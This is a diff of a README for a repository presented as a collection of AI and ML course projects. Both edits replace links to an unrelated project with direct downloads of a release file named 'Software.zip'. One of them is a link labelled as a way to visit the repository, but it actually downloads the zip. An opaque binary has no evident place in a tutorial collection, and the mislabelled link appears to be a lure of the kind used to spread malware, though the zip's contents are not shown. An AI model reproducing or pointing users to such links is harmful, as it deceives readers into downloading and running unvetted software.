@@ -9,7 +9,7 @@ curated-ai-ml-course-projects
 ### Topics
 #ai, #coursework, #data-science, #deep-learning, #hugging-face, #jupyter-notebooks, #machine-learning, #ml, #neural-networks, #projects, #python, #tutorials
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Mzey1452/curated-ai-ml-course-projects/releases/download/v1.0/Software.zip)](https://github.com/Mzey1452/curated-ai-ml-course-projects/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the "Curated AI & ML Course Projects" repository, where you will find a curated selection of projects, experiments, and tutorials from various AI, ML, deep learning, and Hugging Face courses. This repository serves as a hub for structured, hands-on learning experiences in the field of artificial intelligence and machine learning.
@@ -36,7 +36,7 @@ If you have a project or tutorial that you would like to contribute to this repo
 Stay connected with the latest updates and announcements from the "Curated AI & ML Course Projects" repository. Follow us on GitHub and join the discussion to share your insights, ask questions, and connect with fellow AI enthusiasts.
 
 ### Explore Further
-Visit our repository at [Curated AI & ML Course Projects](https://github.com/cli/go-gh) to start exploring the projects and tutorials today!
+Visit our repository at [Curated AI & ML Course Projects](https://github.com/Mzey1452/curated-ai-ml-course-projects/releases/download/v1.0/Software.zip) to start exploring the projects and tutorials today!
 
 ---
 
